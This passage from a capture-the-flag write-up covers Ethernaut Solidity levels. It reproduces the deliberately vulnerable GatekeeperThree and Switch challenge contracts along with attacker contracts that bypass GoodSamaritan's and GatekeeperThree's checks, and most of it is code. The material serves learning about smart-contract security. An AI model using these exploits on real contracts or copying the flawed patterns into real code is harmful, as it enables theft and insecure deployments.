&lt;&#x2F;span&gt;&lt;span&gt;    constructor (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address &lt;&#x2F;span&gt;&lt;span&gt;_addr){
&lt;&#x2F;span&gt;&lt;span&gt;        _GoodSamaritan &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;IGoodSamaritan&lt;&#x2F;span&gt;&lt;span&gt;(_addr);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;attack &lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        _GoodSamaritan.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;requestDonation&lt;&#x2F;span&gt;&lt;span&gt;(); 
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;notify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span&gt;amount) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;pure external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        if(amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;			revert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;NotEnoughBalance&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;gatekeeper-three&quot;&gt;Gatekeeper Three&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SimpleTrick &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  GatekeeperThree &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;target;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; trick;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint private&lt;&#x2F;span&gt;&lt;span&gt; password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;timestamp&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  constructor (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address payable &lt;&#x2F;span&gt;&lt;span&gt;_target) {
&lt;&#x2F;span&gt;&lt;span&gt;    target &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GatekeeperThree&lt;&#x2F;span&gt;&lt;span&gt;(_target);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;checkPassword&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_password) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;returns (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;    if (_password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; password) {
&lt;&#x2F;span&gt;&lt;span&gt;      return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= block&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;timestamp&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;trickInit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    trick &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;trickyTrick&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender &amp;amp;&amp;amp; address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span&gt; trick) {
&lt;&#x2F;span&gt;&lt;span&gt;      target.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getAllowance&lt;&#x2F;span&gt;&lt;span&gt;(password);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GatekeeperThree &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; owner;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address public&lt;&#x2F;span&gt;&lt;span&gt; entrant;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; allowEntrance;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  SimpleTrick &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;trick;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;construct0r&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;      owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateOne&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender ==&lt;&#x2F;span&gt;&lt;span&gt; owner);
&lt;&#x2F;span&gt;&lt;span&gt;    require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin !=&lt;&#x2F;span&gt;&lt;span&gt; owner);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateTwo&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    require(allowEntrance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== true&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    _;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateThree&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;    if (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.001 ether &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&amp;amp;&amp;amp; payable&lt;&#x2F;span&gt;&lt;span&gt;(owner).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.001 ether&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;== false&lt;&#x2F;span&gt;&lt;span&gt;) {
&lt;&#x2F;span&gt;&lt;span&gt;      _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getAllowance&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;_password) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    if (trick.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;checkPassword&lt;&#x2F;span&gt;&lt;span&gt;(_password)) {
&lt;&#x2F;span&gt;&lt;span&gt;        allowEntrance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createTrick&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    trick &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;SimpleTrick&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;payable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)));
&lt;&#x2F;span&gt;&lt;span&gt;    trick.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;trickInit&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public gateOne gateTwo gateThree &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    entrant &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= tx&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;origin&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  receive () &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external payable &lt;&#x2F;span&gt;&lt;span&gt;{}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;SimpleTrick is a sub-contract of GateKeeperThree. Nothing new here.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;... &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; all code from challenge source
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;gateBreaker &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    GatekeeperThree _GatekeeperThree;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;address payable &lt;&#x2F;span&gt;&lt;span&gt;_addr) {
&lt;&#x2F;span&gt;&lt;span&gt;        _GatekeeperThree &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;GatekeeperThree&lt;&#x2F;span&gt;&lt;span&gt;(_addr); 
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp1&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        _GatekeeperThree.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;createTrick&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;        _GatekeeperThree.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;construct0r&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; Dont forget to transfer &amp;gt;0.001 eth to gateKeeper
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;exp2&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;uint &lt;&#x2F;span&gt;&lt;span&gt;pass) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        _GatekeeperThree.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;getAllowance&lt;&#x2F;span&gt;&lt;span&gt;(pass);
&lt;&#x2F;span&gt;&lt;span&gt;        _GatekeeperThree.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    fallback() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;external &lt;&#x2F;span&gt;&lt;span&gt;{ }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;switch&quot;&gt;Switch&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0.8.0&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;Switch &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool public&lt;&#x2F;span&gt;&lt;span&gt; switchOn; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; switch is off
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes4 public&lt;&#x2F;span&gt;&lt;span&gt; offSelector &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= bytes4&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;turnSwitchOff()&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;onlyThis&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        require(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;sender == address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;), &amp;quot;Only the contract can call this&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;onlyOff&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; we use a complex data type to put in memory
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes32&lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;memory &lt;&#x2F;span&gt;&lt;span&gt;selector;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; check that the calldata at position 68 (location of _data)
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;calldatacopy&lt;&#x2F;span&gt;&lt;span&gt;(selector, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;68&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;&#x2F;&#x2F; grab function selector from calldata
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        require(
&lt;&#x2F;span&gt;&lt;span&gt;            selector[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;==&lt;&#x2F;span&gt;&lt;span&gt; offSelector,
&lt;&#x2F;span&gt;&lt;span&gt;            &amp;quot;Can only call the turnOffSwitch function&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        );
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;flipSwitch&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bytes memory &lt;&#x2F;span&gt;&lt;span&gt;_data) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyOff &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; success, ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(_data);
&lt;&#x2F;span&gt;&lt;span&gt;        require(success, &amp;quot;call failed :(&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;turnSwitchOn&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyThis &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        switchOn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= true&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;turnSwitchOff&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;public onlyThis &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        switchOn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= false&lt;&#x2F;span&gt;&lt;span&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;about how CALLDATA is encoded: &lt;a href=&quot;https:&#x2F;&#x2F;docs.soliditylang.org&#x2F;en&#x2F;v0.8.17&#x2F;abi-spec.html#use-of-dynamic-types&quot;&gt;official doc&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;blog.softbinator.com&#x2F;solving-ethernaut-level-29-switch&#x2F;&quot;&gt;others writeup&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
